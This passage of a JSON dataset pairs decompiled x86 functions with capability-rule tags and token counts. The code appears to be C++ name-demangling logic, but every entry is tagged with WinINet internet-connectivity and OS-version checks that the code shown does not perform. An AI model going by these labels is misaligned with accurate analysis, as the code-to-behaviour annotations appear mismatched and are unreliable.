{\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n                if (uVar3 == 0x4f) {\n                    uVar5 = *(in_EAX + 0x30);\n                    *(in_EAX + 0x30) = 1;\n                    iVar6 = fcn.0040ea70();\n                    *(in_EAX + 0x30) = uVar5;\n                    if (iVar6 == 0) {\n                        return NULL;\n                    }\n                    if (**(in_EAX + 0xc) != 'E') {\n                        return NULL;\n                    }\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            else {\n                if (uVar3 != 0x77) {\n                    return NULL;\n                }\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 6;\n                iVar6 = fcn.00410270();\n                if (iVar6 == 0) {\n                    return NULL;\n                }\n                if (**(in_EAX + 0xc) != 'E') {\n                    return NULL;\n                }\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            }\n        }\n        piVar7 = fcn.0040df00(iVar6);\n        *ppiVar1 = piVar7;\n        if (piVar7 == NULL) {\n            return NULL;\n        }\n        pcVar4 = *(in_EAX + 0xc);\n        ppiVar1 = piVar7 + 2;\n        cVar2 = *pcVar4;\n        iVar6 = fcn.0040e690();\n    } while( true );\n}\n",
        "token_count": 1078
    },
    "00410650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.00410650(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint8_t *puVar11;\n    uint unaff_EDI;\n    uint8_t *puVar12;\n    bool bVar13;\n    bool bVar14;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    cVar3 = *pcVar1;\n    if (cVar3 - 0x30U < 10) {\n        puVar5 = fcn.0040e270();\n        cVar3 = **(in_EAX + 0xc);\n        goto joined_r0x00410761;\n    }\n    if (cVar3 + 0x9fU < 0x1a) {\n        if ((cVar3 == 'o') && (pcVar1[1] == 'n')) {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n        }\n        puVar5 = fcn.004100c0();\n        if (puVar5 != NULL) {\n            bVar13 = *puVar5 < 0x31;\n            bVar14 = *puVar5 == 0x31;\n            if (bVar14) {\n                puVar11 = *puVar5[2];\n                iVar9 = 3;\n                *(in_EAX + 0x2c) = puVar5[2][2] + *(in_EAX + 0x2c) + 7;\n                puVar12 = 0x50399c;\n                do {\n                    if (iVar9 == 0) break;\n                    iVar9 = iVar9 + -1;\n                    bVar13 = *puVar11 < *puVar12;\n                    bVar14 = *puVar11 == *puVar12;\n                    puVar11 = puVar11 + 1;\n                    puVar12 = puVar12 + 1;\n                } while (bVar14);\n                if ((!bVar13 && !bVar14) == bVar13) {\n                    uVar7 = fcn.0040e270();\n                    puVar5 = fcn.0040df00(uVar7);\n                }\n            }\n        }\n    }\n    else {\n        if (cVar3 + 0xbdU < 2) {\n            piVar10 = *(in_EAX + 0x28);\n            if ((piVar10 == NULL) || ((*piVar10 != 0 && (*piVar10 != 0x18)))) {\n                if (cVar3 == 'D') {\ncode_r0x004108b9:\n    // switch table (6 cases) at 0x5039a0\n                    switch(pcVar1[1]) {\n                    case '0':\n                        uVar6 = 1;\n                        break;\n                    case '1':\n                        uVar6 = 2;\n                        break;\n                    case '2':\n                        uVar6 = 3;\n                        break;\n                    default:\n                        goto code_r0x004107f2;\n                    case '4':\n                        uVar6 = 4;\n                        break;\n                    case '5':\n                        uVar6 = 5;\n                    }\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    iVar9 = *(in_EAX + 0x14);\n                    if (iVar9 < *(in_EAX + 0x18)) {\n                        puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                        puVar5[1] = 0;\n                        *(in_EAX + 0x14) = iVar9 + 1;\n                        if (piVar10 != NULL) {\n                            puVar5[1] = 0;\n                            *puVar5 = 8;\n                            puVar5[2] = uVar6;\n                            puVar5[3] = piVar10;\n                            cVar3 = pcVar1[2];\n                            goto joined_r0x00410761;\n                        }\n                    }\n                    cVar3 = pcVar1[2];\n                    goto code_r0x00410944;\n                }\n            }\n            else {\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + piVar10[3];\n                cVar3 = *pcVar1;\n                if (cVar3 != 'C') {\n                    if (cVar3 == 'D') goto code_r0x004108b9;\ncode_r0x00410944:\n                    puVar5 = NULL;\n                    goto joined_r0x00410761;\n                }\n            }\n            if (pcVar1[1] == 'I') {\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                cVar3 = pcVar1[2];\n                if (4 < cVar3 - 0x31U) {\n                    cVar3 = pcVar1[1];\n                    puVar5 = NULL;\n                    goto joined_r0x00410761;\n                }\n                *(in_EAX + 0xc) = pcVar1 + 3;\n                uVar6 = *((cVar3 - 0x31U) * 4 + 0x5040b8);\n                fcn.0040f7c0();\n                piVar10 = *(in_EAX + 0x28);\n            }\n            else {\n                uVar2 = pcVar1[1] - 0x31;\n                if (4 < uVar2) {\ncode_r0x004107f2:\n                    return NULL;\n                }\n                *(in_EAX + 0xc) = pcVar1 + 2;\n                uVar6 = *(uVar2 * 4 + 0x5040b8);\n            }\n            iVar9 = *(in_EAX + 0x14);\n            if (iVar9 < *(in_EAX + 0x18)) {\n                puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                puVar5[1] = 0;\n                *(in_EAX + 0x14) = iVar9 + 1;\n                if ((piVar10 != NULL) && (uVar6 - 1 < 5)) {\n                    puVar5[1] = 0;\n                    *puVar5 = 7;\n                    puVar5[2] = uVar6;\n                    puVar5[3] = piVar10;\n                    goto code_r0x00410691;\n                }\n            }\ncode_r0x004109f0:\n            puVar5 = NULL;\n            cVar3 = **(in_EAX + 0xc);\n            goto joined_r0x00410761;\n        }\n        if (cVar3 == 'L') {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            puVar5 = fcn.0040e270();\n            if (puVar5 == NULL) {\n                return NULL;\n            }\n            iVar9 = fcn.0040e6e0();\n            if (iVar9 == 0) {\n                return NULL;\n            }\n        }\n        else {\n            if (cVar3 != 'U') {\n                return NULL;\n            }\n            if (pcVar1[1] == 'l') {\n                puVar5 = NULL;\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                cVar3 = pcVar1[1];\n                if (cVar3 != 'l') goto joined_r0x00410761;\n                *(in_EAX + 0xc) = pcVar1 + 2;\n                uVar6 = fcn.00410270();\n                if (uVar6 == 0) goto code_r0x00410691;\n                cVar3 = **(in_EAX + 0xc);\n                if (cVar3 != 'E') goto joined_r0x00410761;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                uVar8 = fcn.0040e1d0();\n                if (-1 < uVar8) {\n                    iVar9 = *(in_EAX + 0x14);\n                    pcVar1 = *(in_EAX + 0xc);\n                    if (iVar9 < *(in_EAX + 0x18)) {\n                        puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                        puVar5[1] = 0;\n                        *(in_EAX + 0x14) = iVar9 + 1;\n                        puVar5[3] = uVar8;\n                        iVar9 = *(in_EAX + 0x20);\n                        *puVar5 = 0x45;\n                        puVar5[2] = uVar6;\n                        if (iVar9 < *(in_EAX + 0x24)) {\n                            *(*(in_EAX + 0x1c) + iVar9 * 4) = puVar5;\n                            *(in_EAX + 0x20) = iVar9 + 1;\n                            cVar3 = *pcVar1;\n                            goto joined_r0x00410761;\n                        }\n                    }\n                    cVar3 = *pcVar1;\n                    puVar5 = NULL;\n                    goto joined_r0x00410761;\n                }\n                goto code_r0x004109f0;\n            }\n            if (pcVar1[1] != 't') {\n                return NULL;\n            }\n            puVar5 = NULL;\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            cVar3 = pcVar1[1];\n            if (cVar3 != 't') goto joined_r0x00410761;\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            uVar6 = fcn.0040e1d0();\n            if (-1 < uVar6) {\n                iVar9 = *(in_EAX + 0x14);\n                if (iVar9 < *(in_EAX + 0x18)) {\n                    puVar5 = iVar9 * 0x10 + *(in_EAX + 0x10);\n                    puVar5[1] = 0;\n                    *(in_EAX + 0x14) = iVar9 + 1;\n                    pcVar1 = *(in_EAX + 0xc);\n                    puVar5[2] = uVar6;\n                    iVar9 = *(in_EAX + 0x20);\n                    *puVar5 = 0x47;\n                    if (iVar9 < *(in_EAX + 0x24)) {\n                        *(*(in_EAX + 0x1c) + iVar9 * 4) = puVar5;\n                        *(in_EAX + 0x20) = iVar9 + 1;\n                        cVar3 = *pcVar1;\n                    }\n                    else {\n                        cVar3 = *pcVar1;\n                        puVar5 = NULL;\n                    }\n                    goto joined_r0x00410761;\n                }\n                goto code_r0x004109f0;\n            }\n        }\n    }\ncode_r0x00410691:\n    cVar3 = **(in_EAX + 0xc);\njoined_r0x00410761:\n    if (cVar3 == 'B') {\n        uVar7 = *(in_EAX + 0x28);\n        pcVar1 = *(in_EAX + 0xc);\n        cVar3 = *pcVar1;\n        while (cVar3 == 'B') {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            uVar4 = fcn.0040e270();\n            puVar5 = fcn.0040df00(uVar4, unaff_EBX, unaff_ESI, unaff_EDI);\n            pcVar1 = *(in_EAX + 0xc);\n            cVar3 = *pcVar1;\n        }\n        *(in_EAX + 0x28) = uVar7;\n        return puVar5;\n    }\n    return puVar5;\n}\n",
        "token_count": 2698
    },
    "00410a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * __fastcall fcn.00410a50(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    uint32_t *puVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    char *pcVar13;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if ((*pcVar2 == 'G') || (*pcVar2 == 'T')) {\n        iVar7 = *(in_EAX + 0x2c);\n        *(in_EAX + 0x2c) = iVar7 + 0x14;\n        if (*pcVar2 == 'T') {\n            *(in_EAX + 0xc) = pcVar2 + 1;\n            if (pcVar2[1] == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar2 + 2;\n    // switch table (52 cases) at 0x503a80\n            switch(pcVar2[1]) {\n            case 'C':\n                uVar6 = fcn.0040f7c0();\n                iVar7 = fcn.0040e0d0();\n                if (iVar7 < 0) {\n                    return NULL;\n                }\n                if (**(in_EAX + 0xc) == '_') {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                    fcn.0040f7c0();\n                    *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 5;\n                    puVar4 = fcn.0040df00(uVar6);\n                    return puVar4;\n                }\n                return NULL;\n            default:\n                return NULL;\n            case 'F':\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'H':\n                fcn.0040f2e0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'I':\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'J':\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'S':\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'T':\n                *(in_EAX + 0x2c) = iVar7 + 10;\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'V':\n                *(in_EAX + 0x2c) = iVar7 + 0xf;\n                fcn.0040f7c0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'W':\n                fcn.0040f2e0();\n                puVar4 = fcn.0040df00(0);\n                break;\n            case 'c':\n                iVar7 = fcn.0040e620();\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                iVar7 = fcn.0040e620();\n                if (iVar7 != 0) {\n                    fcn.00410a50();\n                    puVar4 = fcn.0040df00(0);\n                    return puVar4;\n                }\n                return NULL;\n            case 'h':\n                iVar7 = fcn.0040e620();\n                if (iVar7 != 0) {\n                    fcn.00410a50();\n                    puVar4 = fcn.0040df00(0);\n                    return puVar4;\n                }\n                return NULL;\n            case 'v':\n                iVar7 = fcn.0040e620();\n                if (iVar7 == 0) {\n                    return 0;\n                }\n                fcn.00410a50();\n                puVar4 = fcn.0040df00(0);\n                return puVar4;\n            }\n            return puVar4;\n        }\n        if (*pcVar2 != 'G') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar2 + 1;\n        if (pcVar2[1] != '\\0') {\n            *(in_EAX + 0xc) = pcVar2 + 2;\n    // switch table (50 cases) at 0x5039b8\n            switch(pcVar2[1]) {\n            case 'A':\n                fcn.00410a50();\n                puVar4 = fcn.0040df00(0);\n                return puVar4;\n            default:\n                return 0;\n            case 'R':\n                fcn.0040f2e0();\n                uVar6 = fcn.0040e190();\n                puVar4 = fcn.0040df00(uVar6);\n                return puVar4;\n            case 'T':\n                if ((pcVar2[2] != '\\0') && (*(in_EAX + 0xc) = pcVar2 + 3,  pcVar2[2] == 'n')) {\n                    fcn.00410a50();\n                    puVar4 = fcn.0040df00(0);\n                    return puVar4;\n                }\n                fcn.00410a50();\n                puVar4 = fcn.0040df00(0);\n                return puVar4;\n            case 'V':\n                fcn.0040f2e0();\n                puVar4 = fcn.0040df00(0);\n                return puVar4;\n            case 'r':\n                goto code_r0x00410c50;\n            }\n        }\n        return NULL;\n    }\n    puVar4 = fcn.0040f2e0();\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    if ((param_2 != 0) && ((*(in_EAX + 8) & 1) == 0)) {\n        do {\n            uVar3 = *puVar4;\n            if (uVar3 != 0x4c) {\n                if (uVar3 < 0x4d) {\n                    if (4 < uVar3 - 0x1c) goto code_r0x00410aab;\n                }\n                else if (1 < uVar3 - 0x4e) {\ncode_r0x00410aab:\n                    if (uVar3 != 2) {\n                        return puVar4;\n                    }\n                    puVar10 = puVar4[3];\n                    uVar3 = *puVar10;\n                    do {\n                        if (uVar3 != 0x4c) {\n                            if (uVar3 < 0x4d) {\n                                if (4 < uVar3 - 0x1c) {\n                                    return puVar4;\n                                }\n                            }\n                            else if (1 < uVar3 - 0x4e) {\n                                return puVar4;\n                            }\n                        }\n                        puVar10 = puVar10[2];\n                        uVar3 = *puVar10;\n                        puVar4[3] = puVar10;\n                    } while( true );\n                }\n            }\n            puVar4 = puVar4[2];\n        } while( true );\n    }\n    if (**(in_EAX + 0xc) == '\\0') {\n        return puVar4;\n    }\n    puVar10 = puVar4;\n    if (**(in_EAX + 0xc) == 'E') {\n        return puVar4;\n    }\n    do {\n        uVar3 = *puVar10;\n        if (uVar3 < 0x21) {\n            if (0x1b < uVar3) goto code_r0x00410bef;\n            if (uVar3 != 2) {\n                if ((uVar3 == 4) && (puVar10 = puVar10[2],  puVar10 != NULL)) goto code_r0x00410b4d;\n                break;\n            }\n            puVar10 = puVar10[3];\n        }\n        else {\n            if ((uVar3 != 0x4c) && ((uVar3 < 0x4c || (1 < uVar3 - 0x4e)))) break;\ncode_r0x00410bef:\n            puVar10 = puVar10[2];\n        }\n    } while (puVar10 != NULL);\ncode_r0x00410b98:\n    piVar5 = fcn.00410570();\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if (((param_2 == 0) && (*puVar4 == 2)) && (*piVar5 == 0x29)) {\n        piVar5[2] = 0;\n    }\n    puVar4 = fcn.0040df00(piVar5);\n    return puVar4;\ncode_r0x00410b4d:\n    uVar3 = *puVar10;\n    if (8 < uVar3) goto code_r0x00410b98;\n    if (((6 < uVar3) || (1 < uVar3 - 1)) || (puVar10 = puVar10[3],  puVar10 == NULL)) goto code_r0x00410b98;\n    goto code_r0x00410b4d;\ncode_r0x00410c50:\n    iVar7 = fcn.0040e0d0();\n    if (iVar7 < 2) {\n        return 0;\n    }\n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 == '\\0') {\n        return 0;\n    }\n    pcVar13 = pcVar2 + 1;\n    *(in_EAX + 0xc) = pcVar13;\n    if (*pcVar2 != '_') {\n        return 0;\n    }\n    iVar7 = iVar7 + -1;\n    puVar9 = NULL;\n    do {\n        if (*pcVar13 == '\\0') {\n            return NULL;\n        }\n        if (*pcVar13 == '$') {\n            cVar1 = pcVar13[1];\n            if (cVar1 == 'S') {\n                uVar6 = 0x2f;\n            }\n            else if (cVar1 == '_') {\n                uVar6 = 0x2e;\n            }\n            else {\n                if (cVar1 != '$') {\n                    return NULL;\n                }\n                uVar6 = 0x24;\n            }\n            iVar11 = *(in_EAX + 0x14);\n            pcVar13 = *(in_EAX + 0xc) + 2;\n            if (*(in_EAX + 0x18) <= iVar11) {\n                *(in_EAX + 0xc) = pcVar13;\n                return NULL;\n            }\n            iVar7 = iVar7 + -2;\n            puVar12 = iVar11 * 0x10 + *(in_EAX + 0x10);\n            puVar12[1] = 0;\n            *(in_EAX + 0x14) = iVar11 + 1;\n            *puVar12 = 0x40;\n            puVar12[2] = uVar6;\n            *(in_EAX + 0xc) = pcVar13;\n        }\n        else {\n            iVar11 = 0;\n            do {\n                iVar11 = iVar11 + 1;\n                if (iVar7 <= iVar11) {\n                    iVar8 = *(in_EAX + 0x14);\n                    if (*(in_EAX + 0x18) == iVar8 || *(in_EAX + 0x18) < iVar8) goto code_r0x00411118;\n                    goto code_r0x004110bf;\n                }\n            } while ((pcVar13[iVar11] != '$') && (pcVar13[iVar11] != '\\0'));\n            iVar8 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar8) {\ncode_r0x00411118:\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar11;\n                return NULL;\n            }\ncode_r0x004110bf:\n            iVar7 = iVar7 - iVar11;\n            puVar12 = iVar8 * 0x10 + *(in_EAX + 0x10);\n            puVar12[1] = 0;\n            *(in_EAX + 0x14) = iVar8 + 1;\n            puVar12[2] = pcVar13;\n            iVar8 = *(in_EAX + 0xc);\n            puVar12[1] = 0;\n            pcVar13 = iVar8 + iVar11;\n            *puVar12 = 0;\n            puVar12[3] = iVar11;\n            *(in_EAX + 0xc) = pcVar13;\n        }\n        if ((puVar9 != NULL) && (puVar12 = fcn.0040df00(puVar12),  puVar12 == NULL)) {\n            return NULL;\n        }\n        puVar9 = puVar12;\n        if (iVar7 < 1) {\n            puVar4 = fcn.0040df00(0);\n            return puVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 3017
    },
    "00411160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00411160(uint32_t *param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t **ppuVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    char cVar12;\n    uint32_t ***pppuVar13;\n    char *pcVar14;\n    uchar *puVar15;\n    char *pcVar16;\n    uint32_t uVar17;\n    uint8_t *puVar18;\n    uint8_t *puVar19;\n    int32_t iVar20;\n    uint32_t **ppuVar21;\n    uint32_t ***pppuVar22;\n    char *pcVar23;\n    uint8_t *puVar24;\n    uint32_t ***pppuVar25;\n    uchar uVar26;\n    bool bVar27;\n    bool bVar28;\n    uchar uVar29;\n    uint32_t uStack132;\n    uint32_t **ppuStack128;\n    uint32_t **ppuStack124;\n    int32_t iStack120;\n    uint32_t *puStack108;\n    uint uStack104;\n    uint32_t **ppuStack100;\n    uchar auStack96 [4];\n    uint32_t **appuStack92 [19];\n    \n    if (param_1 == NULL) {\n        *(in_EAX + 0x118) = 1;\n        return;\n    }\n    uVar17 = param_1[1];\n    if ((1 < uVar17) || (iVar20 = *(in_EAX + 0x11c),  0x400 < iVar20)) {\n        *(in_EAX + 0x118) = 1;\n        return;\n    }\n    puStack108 = param_1;\n    param_1[1] = uVar17 + 1;\n    ppuStack128 = *(in_EAX + 0x118);\n    *(in_EAX + 0x11c) = iVar20 + 1;\n    uStack104 = *(in_EAX + 300);\n    *(in_EAX + 300) = &puStack108;\n    if (ppuStack128 != NULL) goto code_r0x00411361;\n    uVar6 = *param_1;\n    // switch table (80 cases) at 0x503dbc\n    switch(uVar6) {\n    case 0:\n        pcVar16 = param_1[2];\n        if ((param_2 & 4) == 0) {\n            if (param_1[3] != 0) {\n                pcVar23 = pcVar16 + param_1[3];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    cVar12 = *pcVar16;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    pcVar16 = pcVar16 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = cVar12;\n                    in_EAX[0x104] = cVar12;\n                    iVar20 = iVar4;\n                } while (pcVar23 != pcVar16);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            pcVar23 = pcVar16 + param_1[3];\n            if (pcVar16 < pcVar23) {\n                do {\n                    cVar12 = *pcVar16;\n                    if ((((3 < pcVar23 - pcVar16) && (cVar12 == '_')) && (pcVar16[1] == '_')) &&\n                       ((pcVar16[2] == 'U' && (pcVar14 = pcVar16 + 3,  pcVar14 < pcVar23)))) {\n                        uStack132 = 0;\n                        do {\n                            cVar1 = *pcVar14;\n                            iVar20 = cVar1;\n                            if (cVar1 - 0x30U < 10) {\n                                iVar20 = iVar20 + -0x30;\n                            }\n                            else if (cVar1 + 0xbfU < 6) {\n                                iVar20 = iVar20 + -0x37;\n                            }\n                            else {\n                                if (5 < cVar1 + 0x9fU) {\n                                    if (((pcVar14 < pcVar23) && (uStack132 < 0x100)) && (cVar1 == '_')) {\n                                        if (*(in_EAX + 0x100) == 0xff) {\n                                            in_EAX[0xff] = 0;\n                                            (**(in_EAX + 0x108))();\n                                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                                            *(in_EAX + 0x100) = 0;\n                                        }\n                                        iVar20 = *(in_EAX + 0x100);\n                                        *(in_EAX + 0x100) = iVar20 + 1;\n                                        in_EAX[iVar20] = uStack132;\n                                        in_EAX[0x104] = uStack132;\n                                        goto code_r0x00414066;\n                                    }\n                                    break;\n                                }\n                                iVar20 = iVar20 + -0x57;\n                            }\n                            pcVar14 = pcVar14 + 1;\n                            uStack132 = iVar20 + uStack132 * 0x10;\n                        } while (pcVar23 != pcVar14);\n                    }\n                    iVar4 = *(in_EAX + 0x100);\n                    iVar20 = iVar4 + 1;\n                    if (iVar4 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 0;\n                        iVar20 = 1;\n                    }\n                    *(in_EAX + 0x100) = iVar20;\n                    in_EAX[iVar4] = cVar12;\n                    in_EAX[0x104] = cVar12;\n                    pcVar14 = pcVar16;\ncode_r0x00414066:\n                    pcVar16 = pcVar14 + 1;\n                } while (pcVar16 < pcVar23);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 1:\n    case 2:\n        fcn.00411160();\n        if ((param_2 & 4) == 0) {\n            puVar15 = 0x503b56;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar15 != 0x503b58);\n        }\n        else {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x2e;\n            in_EAX[0x104] = 0x2e;\n        }\n        piVar5 = param_1[3];\n        if (*piVar5 == 0x46) {\n            pcVar16 = \"{default arg#\";\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                pcVar16 = pcVar16 + 1;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar16 != \"\");\n            sub.msvcrt.dll_sprintf(appuStack92, 0x503b67, piVar5[3] + 1);\n            uVar17 = 0xffffffff;\n            pppuVar22 = appuStack92;\n            do {\n                if (uVar17 == 0) break;\n                uVar17 = uVar17 - 1;\n                cVar12 = *pppuVar22;\n                pppuVar22 = pppuVar22 + 1;\n            } while (cVar12 != '\\0');\n            if (~uVar17 - 1 != 0) {\n                pppuVar22 = appuStack92;\n                pppuVar13 = (~uVar17 - 1) + pppuVar22;\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *pppuVar22;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    *(in_EAX + 0x100) = iVar4;\n                    pppuVar22 = pppuVar22 + 1;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (pppuVar13 != pppuVar22);\n            }\n            puVar15 = 0x503b6a;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                puVar15 = puVar15 + 1;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar15 != 0x503b6d);\n        }\n        fcn.00411160();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 3:\n        uVar2 = *(in_EAX + 0x114);\n        *(in_EAX + 0x114) = 0;\n        ppuStack124 = param_1[2];\n        if (ppuStack124 == NULL) {\ncode_r0x0041510b:\n            *(in_EAX + 0x118) = 1;\n        }\n        else {\n            iStack120 = 0;\n            ppuVar21 = *(in_EAX + 0x110);\n            pppuVar22 = appuStack92;\n            pppuVar13 = NULL;\n            do {\n                pppuVar25 = pppuVar22;\n                *pppuVar25 = pppuVar13;\n                pppuVar25[2] = NULL;\n                puVar7 = *ppuStack124;\n                pppuVar25[1] = ppuStack124;\n                pppuVar25[3] = ppuVar21;\n                iStack120 = iStack120 + 1;\n                if (puVar7 != 0x4c) {\n                    if (puVar7 < 0x4d) {\n                        if (0x4 < puVar7 + -7) {\ncode_r0x00412b9e:\n                            *(in_EAX + 0x114) = pppuVar25;\n                            if (puVar7 != 0x2) goto code_r0x00412bad;\n                            ppuStack124 = ppuStack124[3];\n                            if ((*ppuStack124 == 0x46) && 